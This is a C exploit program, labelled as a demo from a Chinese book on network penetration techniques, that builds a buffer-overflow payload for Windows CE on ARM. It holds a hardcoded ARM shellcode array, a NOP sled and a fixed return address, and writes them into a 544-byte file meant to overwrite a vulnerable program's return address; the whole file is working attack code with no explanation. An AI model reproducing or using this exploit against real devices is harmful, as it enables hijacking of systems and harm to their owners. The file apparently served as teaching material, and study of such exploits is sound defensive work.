/* exp.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
* 
*  Windows CE Buffer Overflow Demo
*/
#include<stdio.h>

#define NOP 0xE1A01001  /* mov r1, r1     */
#define LR  0x0002FC50  /* return address */

int shellcode[] =
{
0xEB000010,
0xE28F2F47,
0xEB00002A,
0xE28F0E11,
0xE5900000,
0xE3A01000,
0xE3A02000,
0xE3A03000,
0xE1A0E00F,
0xE1A0F009,
0xE0D020B2,
0xE0D130B2,
0xE3520000,
0x03530000,
0x01A0F00E,
0xE1520003,
0x0AFFFFF8,
0xE1A0F00E,
0xE92D43F0,
0xE28F40CC,
0xE5944000,
0xE3A05FC9,
0xE0845005,
0xE5955000,
0xE1A06005,
0xE3A07000,
0xE5960008,
0xE28F102C,
0xEBFFFFEC,
0x0596707C,
0x0596808C,
0xE0879008,
0x0A000003,
0xE5966004,
0xE3560000,
0x11560005,
0x1AFFFFF4,
0xE1A00007,
0xE0881007,
0xE8BD83F0,
0x006F0063,
0x00650072,
0x006C0064,
0x002E006C,
0x006C0064,
0x0000006C,
0xE92D4070,
0xE5914020,
0xE0844000,
0xE3A06000,
0xE4947004,
0xE0877000,
0xE1A08002,
0xE3A0A000,
0xE4D79001,
0xE3590000,
0x0A000001,
0xE089A3EA,
0xEAFFFFFA,
0xE5989000,
0xE15A0009,
0x12866001,
0x1AFFFFF2,
0xE5915024,
0xE0855000,
0xE0866006,
0xE19590B6,
0xE591501C,
0xE0855000,
0xE7959109,
0xE0899000,
0xE8BD8070,
0xFFFFC800,
0x0101003C,
0x283A9DE7,
};

/* prints a long to a string */
char* put_long(char* ptr, long value)
{
    *ptr++ = (char) (value >> 0) & 0xff;
    *ptr++ = (char) (value >> 8) & 0xff;
    *ptr++ = (char) (value >> 16) & 0xff;
    *ptr++ = (char) (value >> 24) & 0xff;

    return ptr;
}

int main()
{
    FILE * binFileH;
    char binFile[] = "binfile";
    char buf[544];
    char *ptr;
    int  i;

    if ( (binFileH = fopen(binFile, "wb")) == NULL )
    {
        printf("can't create file %s!\n", binFile);
        return 1;
    }

    memset(buf, 0, sizeof(buf)-1);
    ptr = buf;

    for (i = 0; i < 4; i++) {
        ptr = put_long(ptr, NOP);
    }
    memcpy(buf+16, shellcode, sizeof(shellcode));
    put_long(ptr-16+540, LR);

    fwrite(buf, sizeof(char), 544, binFileH);
    fclose(binFileH);
}
